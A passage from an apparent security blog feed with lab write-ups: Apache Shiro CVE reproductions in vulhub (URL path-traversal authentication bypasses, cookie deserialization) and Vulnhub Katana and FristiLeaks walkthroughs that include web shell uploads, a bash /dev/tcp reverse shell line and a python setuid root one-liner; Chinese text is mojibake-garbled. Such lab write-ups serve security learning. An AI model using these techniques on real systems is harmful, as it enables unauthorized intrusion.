    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä»¥ä¸‹æ¼æ´éƒ½å¯ä»¥ä»vulhubä¸‹è½½<br>@<a href="https://github.com/vulhub/vulhub/tree/master/shiro">https://github.com/vulhub/vulhub/tree/master/shiro</a></p><h1 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h1><p>å½±å“ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache Shiro &lt; 1.1.0<br>JSecurity 0.9.x<br></code></pre></td></tr></table></figure><p>æ¼æ´åŸç†<br>shiroè¿›è¡Œæƒé™éªŒè¯å‰æœªå¯¹urlåšæ ‡å‡†åŒ–å¤„ç†ï¼Œå¯ä»¥é€šè¿‡æ„é€ /ã€//ã€/./ã€/../ç­‰ç»•è¿‡æƒé™éªŒè¯<br>dockerå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/shiro/CVE-2010-3863;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>è®¿é—®ip:8080<br>æ­£å¸¸è¯·æ±‚/adminä¼šè·³è½¬å›ç™»å½•é¡µé¢<br><img src="https://i.ibb.co/6RTqfxvV/image.png"><br>æ„é€ /./adminç»•è¿‡éªŒè¯<br><img src="https://i.ibb.co/BV1LRKzJ/image.png"></p><h1 id="CVE-2016-4437-Shiro-550"><a href="#CVE-2016-4437-Shiro-550" class="headerlink" title="CVE-2016-4437(Shiro-550)"></a>CVE-2016-4437(Shiro-550)</h1><p>å½±å“ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache Shiro &lt;= 1.2.4<br></code></pre></td></tr></table></figure><p>æ¼æ´åŸç†<br>åœ¨apache shiro 1.2.4ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„cookieä¸­ã€‚<br>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·cookieè§¦å‘javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨æœºå™¨ä¸­RCE<br>ä½¿ç”¨dockeræ­å»ºç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/shiro/CVE-2016-4437;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>æ‰‹åŠ¨åˆ©ç”¨å¯ä»¥å‚è€ƒ<a href="https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2016-4437/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2016-4437/README.zh-cn.md</a><br>é€šè¿‡æ‰‹åŠ¨æ„é€ æ¶æ„åˆ©ç”¨ç±»<br>è¿™é‡Œæˆ‘ä½¿ç”¨shiroç»¼åˆåˆ©ç”¨å·¥å…·(<a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a>)<br>å…ˆçˆ†ç ´å¯†é’¥ï¼Œå†æ£€æµ‹åˆ©ç”¨é“¾<br><img src="https://i.ibb.co/vxJ5G6jV/image.png"><br>éšåå³å¯æ‰§è¡Œå‘½ä»¤æˆ–è€…æ³¨å…¥å†…å­˜é©¬</p><h1 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h1><p>å½±å“ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache Shiro &lt; 1.5.3<br></code></pre></td></tr></table></figure><p>æ¼æ´åŸç†<br>åœ¨apache shiro 1.5.2ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œåœ¨ä½¿ç”¨springåŠ¨æ€æ§åˆ¶å™¨æ—¶ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ <code>..;</code>è¿™æ ·çš„è·³è½¬,å¯ä»¥ç»•è¿‡shiroä¸­å¯¹ç›®å½•çš„æƒé™é™åˆ¶ã€‚<br>ä½¿ç”¨dockeræ­å»ºç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/shiro/CVE-2020-1957;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>è®¿é—®ip:8080<br>ç›´æ¥è®¿é—®adminä¼šè¢«é‡å®šå‘<br><img src="https://i.ibb.co/wF572Tf8/image.png"><br>æ„é€ <code>/xxx/..;/admin/</code>ç»•è¿‡æƒé™é™åˆ¶,ä¹Ÿå¯ä»¥ä½¿ç”¨fuzzå¯¹å…¶è¿›è¡Œæµ‹è¯•<br><img src="https://i.ibb.co/V0MjFpzw/image.png"></p><h1 id="CVE-2019-12422-Shiro-721"><a href="#CVE-2019-12422-Shiro-721" class="headerlink" title="CVE-2019-12422(Shiro-721)"></a>CVE-2019-12422(Shiro-721)</h1><p>å½±å“ç‰ˆæœ¬</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">6</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-RC2,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ¼æ´åŸç†<br>Shiroä½¿ç”¨äº†AES-128-CBCæ¨¡å¼å¯¹cookieè¿›è¡ŒåŠ å¯†ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡Padding Oracleæ”»å‡»æ–¹å¼æ„é€ åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ”»å‡»,ä¾‹å¦‚SHIRO-550ã€‚(Shiro-721)<br>ç¯å¢ƒæ­å»º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/inspiringz/Shiro-721.git<br><span class="hljs-built_in">cd</span> Shiro-721/Docker<br>docker build -t shiro-721 .<br>docker run -p 8080:8080 -d shiro-721<br></code></pre></td></tr></table></figure><p>è®¿é—®ip:8080<br><img src="https://i.ibb.co/qL6ZYJPD/image.png"><br>å¯å‚è€ƒ<a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> æ‰‹å·¥åˆ©ç”¨<br><img src="https://i.ibb.co/cKp5x2zz/image.png"><br>æˆ‘æ˜¯è„šæœ¬å°å­ç›´æ¥åˆ©ç”¨å·¥å…·ä¸€æŠŠæ¢­<br><img src="https://i.ibb.co/TM15gPGW/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp katana</title>
    <link href="/vulnhub-wp-katana/"/>
    <url>/vulnhub-wp-katana/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-host-discover"><a href="#ğŸ–³-host-discover" class="headerlink" title="ğŸ–³ host discover"></a>ğŸ–³ host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.213.0/24<br>Currently scanning: 192.168.213.0/24   |   Screen View: Unique Hosts                                                                                                <br> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                             <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.213.1   00:50:56:c0:00:08      1      60  VMware, Inc.                   <br> 192.168.213.2   00:50:56:ed:a6:8f      1      60  VMware, Inc.                   <br> 192.168.213.129 00:0c:29:3f:3b:78      1      60  VMware, Inc.                   <br> 192.168.213.254 00:50:56:e3:da:55      1      60  VMware, Inc.             <br></code></pre></td></tr></table></figure><p>target was <code>192.168.213.129</code></p><h1 id="ğŸ‘-service-scan"><a href="#ğŸ‘-service-scan" class="headerlink" title="ğŸ‘ service scan"></a>ğŸ‘ service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.213.129<br>Â·Â·Â·<br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         vsftpd 3.0.3<br>22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:<span class="hljs-built_in">fc</span>:60:a6:de:35 (RSA)<br>|   256 <span class="hljs-built_in">dd</span>:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)<br>|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.38 ((Debian))<br>|_http-title: Katana X<br>|_http-server-header: Apache/2.4.38 (Debian)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)<br>7080/tcp open  ssl/http    LiteSpeed httpd<br>| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US<br>| Not valid before: 2020-05-11T13:57:36<br>|_Not valid after:  2022-05-11T13:57:36<br>|_http-title: Katana X<br>| tls-alpn: <br>|   h2<br>|   spdy/3<br>|   spdy/2<br>|_  http/1.1<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_http-server-header: LiteSpeed<br>8088/tcp open  http        LiteSpeed httpd<br>|_http-server-header: LiteSpeed<br>|_http-title: Katana X<br>8715/tcp open  http        nginx 1.14.2<br>|_http-title: 401 Authorization Required<br>|_http-server-header: nginx/1.14.2<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=Restricted Content<br>MAC Address: 00:0C:29:3F:3B:78 (VMware)<br>Service Info: Host: KATANA; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2024-03-31T02:02:39<br>|_  start_date: N/A<br>|_nbstat: NetBIOS name: KATANA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.9.5-Debian)<br>|   Computer name: katana<br>|   NetBIOS computer name: KATANA\x00<br>|   Domain name: \x00<br>|   FQDN: katana<br>|_  System time: 2024-03-30T22:02:39-04:00<br>Â·Â·Â·<br></code></pre></td></tr></table></figure><p>there was lots of service, letâ€™s try one by one!</p><h1 id="ğŸšªğŸš¶-get-shell"><a href="#ğŸšªğŸš¶-get-shell" class="headerlink" title="ğŸšªğŸš¶ get shell"></a>ğŸšªğŸš¶ get shell</h1><p><em>21</em><br>there was not allow anonymous to login, so try other service<br><em>22</em> we dont have cred<br><em>80</em><br>brute path</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o 80.out -t 50<br>/.htm                 (Status: 403) [Size: 279]<br>/.php                 (Status: 403) [Size: 279]<br>/.                    (Status: 200) [Size: 655]<br>/.htaccess            (Status: 403) [Size: 279]<br>/.phtml               (Status: 403) [Size: 279]<br>/ebook                (Status: 301) [Size: 316] [--&gt; http://192.168.213.129/ebook/]<br>/.htc                 (Status: 403) [Size: 279]<br>/.html_var_DE         (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>/.htpasswd            (Status: 403) [Size: 279]<br></code></pre></td></tr></table></figure><p>nice, there was a ebook path!<br>it was a book store cms, there was two path to get shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9fee67f690cc494cf5198.png"></p><ul><li>login admin and add book, and upload a shell</li><li>use exploit<br>it all fail. fot first, it seems cant write file into the img path.<br>second,it fail too.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 47887.py http://192.168.213.129/ebook<br>/home/rightevil/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn<span class="hljs-string">&#x27;t match a supported version!</span><br><span class="hljs-string">  warnings.warn(&quot;urllib3 (&#123;&#125;) or chardet (&#123;&#125;)/charset_normalizer (&#123;&#125;) doesn&#x27;</span>t match a supported <span class="hljs-string">&quot;</span><br><span class="hljs-string">&gt; Attempting to upload PHP web shell...</span><br><span class="hljs-string">&gt; Verifying shell upload...</span><br><span class="hljs-string">&gt; Web shell failed to upload! The web server may not have write permissions.</span><br></code></pre></td></tr></table></figure>try another port</li></ul><p><em>smb</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.213.129      <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\rightevil]:<br><br>Sharename       Type      Comment<br>---------       ----      -------<br><span class="hljs-built_in">print</span>$          Disk      Printer Drivers<br>IPC$            IPC       IPC Service (Samba 4.9.5-Debian)<br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br><br>Server               Comment<br>---------            -------<br>Workgroup            Master<br>---------            -------<br>WORKGROUP            KATANA<br></code></pre></td></tr></table></figure><p>nothings, and we could use enum4linux to enum user.(user:kanata)<br><em>7080</em><br>itâ€™s a rabbit hole<br>nothing<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9cfa819edad301b9fb320.png"><br>all the page was 403<br><em>8088</em><br>dir brute</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129:8088/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50    <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.213.129:8088/<br>[+] Method:                  GET<br>[+] Threads:                 50<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/cgi-bin              (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/cgi-bin/]<br>/css                  (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/css/]<br>/img                  (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/img/]<br>/docs                 (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/docs/]<br>/.                    (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/./]<br>/.htaccess            (Status: 403) [Size: 1227]<br>/protected            (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/protected/]<br>/blocked              (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/blocked/]<br>Progress: 43007 / 43008 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>yes, the docs was the manual guide page about <code>OpenLiteSpeed Web Server 1.5</code>, but i dont find the exploit about it.<br>letâ€™s search page</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129:8088/  -x txt,php,html --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -t 50<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b0a9e1ebdd1f722de8b3a.png"><br>there was a upload.html<br>after trying, we could upload php file in it, but we it seems dont show in port 8088<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/859db8f34196741dfea2d.png"><br>but it was a web page too(cause /html), so letâ€™s try other port<br><em>8715</em><br>it have a get login, and we could login by <code>admin:admin</code><br>and our backdoor was in this port!<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d0f3004b7f1cb5936ad3d.png"><br>letâ€™s connect to it by weevely(i generate the backdoor by weevely).<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5551bff43abf3c0b9fd33.png"><br>if u want,u could reverse a stable shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.213.128/443 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ğŸ›¡ï¸-PE"><a href="#ğŸ›¡ï¸-PE" class="headerlink" title="ğŸ›¡ï¸ PE"></a>ğŸ›¡ï¸ PE</h1><p>in /home/kanata, we find kanataâ€™s passwd, and there was rootâ€™s hash in /etc/passwd.<br>but kanata dont have sudo or other, and we couldnâ€™t crack the rootâ€™s hash<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a4331a194c20d80939e1c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/32c460295232f487fec5f.png"><br>finally, we find a cap file by linpeas.sh<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7942c6cdc6adac4d12bc3.png"><br>so get root shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d1a64976d90b93131c3f1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/python2.7 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/82e02b691dc2269b66312.png"></p><h1 id="ğŸ“–-recommend-article"><a href="#ğŸ“–-recommend-article" class="headerlink" title="ğŸ“– recommend article"></a>ğŸ“– recommend article</h1><p><a href="https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/privilege-escalation#privilege-escalation-using-file-capabilities">PE about file capabilities</a><br><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">PE about file capabilities in hacktricks</a><br><a href="https://www.vulnhub.com/entry/katana-1,482/">katana vulnhub download</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp fristileaks:1.3</title>
    <link href="/vulnhub-wp-fristileaks-1-3/"/>
    <url>/vulnhub-wp-fristileaks-1-3/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-host-discover"><a href="#ğŸ–³-host-discover" class="headerlink" title="ğŸ–³ host discover"></a>ğŸ–³ host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.165.0/24<br>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                       <br>3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.165.14  96:89:78:52:9c:12      1      60  Unknown vendor                                                                                                       <br>192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                                                                                      <br>192.168.165.240 08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH               <br></code></pre></td></tr></table></figure><p>target was <em>192.168.165.240</em></p><h1 id="ğŸ‘-service-scan"><a href="#ğŸ‘-service-scan" class="headerlink" title="ğŸ‘ service scan"></a>ğŸ‘ service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.165.240<br>Â·Â·Â·<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)<br>| http-robots.txt: 3 disallowed entries <br>|_/cola /sisi /beer<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">| http-methods: </span><br><span class="hljs-string">|_  Potentially risky methods: TRACE</span><br><span class="hljs-string">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="hljs-string">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Â·Â·Â·</span><br></code></pre></td></tr></table></figure><p>there was only 80</p><h1 id="ğŸšªğŸš¶-get-shell"><a href="#ğŸšªğŸš¶-get-shell" class="headerlink" title="ğŸšªğŸš¶ get shell"></a>ğŸšªğŸš¶ get shell</h1><p>in robots, we find three same path,all show a image,so letâ€™s get back to index, it shows we need drink fristi, and there was the drink name in robots, so if the fristi was a path?<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01fab52c842d47cbd9912.png"><br>and it was!<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0403d2b25fdf668618999.png"><br>it was a login page,there was a username and a base64 data.<br>after decode it, it seems a png<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d4eadba357482da4cff46.png"><br>did it was a pass?<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2d98c7edd1d22322a7d57.png"><br>yes. and we could login it by <code>eezeepz:KeKKeKKeKKeKKEKKEK</code><br>and we find a upload.php, letâ€™s upload a backdoor into it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ed5fe3024b6fab5c591cd.png"><br>after trying, we could upload it by change content/type and filename.<br>try to connect it!<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4d3bfeaab97b43c68f3fe.png"><br>we got a normal shell.<br>we got a hints in eezeepzâ€™s home<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7d79a299be313448dcd68.png"><br>but we dont have w in /home/admin, and there dont have bash or sh in/usr/bin/, so i chmod 777 to /home/admin, and copy a bash in it, and bound shell.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4245ecac6bee899794c54.png"><br>and copy a bash to it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b59150459845457933261.png"></p><h1 id="ğŸ›¡ï¸-PE"><a href="#ğŸ›¡ï¸-PE" class="headerlink" title="ğŸ›¡ï¸ PE"></a>ğŸ›¡ï¸ PE</h1><p>now we have adminâ€™s shell and find a encode file<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ae021d374305e2ba1d1e8.png"><br>so letâ€™s decode it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/27f9259497ff072ebac7e.png"><br>it was adminâ€™s password,after trying<br>and there was another encode str,after we decode it and trying, it was the password of fristigod<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b545e29dc4221e1578bcb.png"><br>and we su this user, and find this user have sudo<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2004968abb7ed38b02dd7.png"><br>and get root shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ad35b3a96b21278512b28.png"></p><h1 id="ğŸ“–-recommend-article"><a href="#ğŸ“–-recommend-article" class="headerlink" title="ğŸ“– recommend article"></a>ğŸ“– recommend article</h1><p><a href="https://infosecwriteups.com/vulnhub-fristileaks-1-3-walkthrough-994d7770d363">another walkthrough</a><br><a href="https://www.vulnhub.com/entry/fristileaks-13,133/">fristileaks download</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp escalate:1</title>
    <link href="/vulnhub-wp-escalate-1/"/>
    <url>/vulnhub-wp-escalate-1/</url>
    
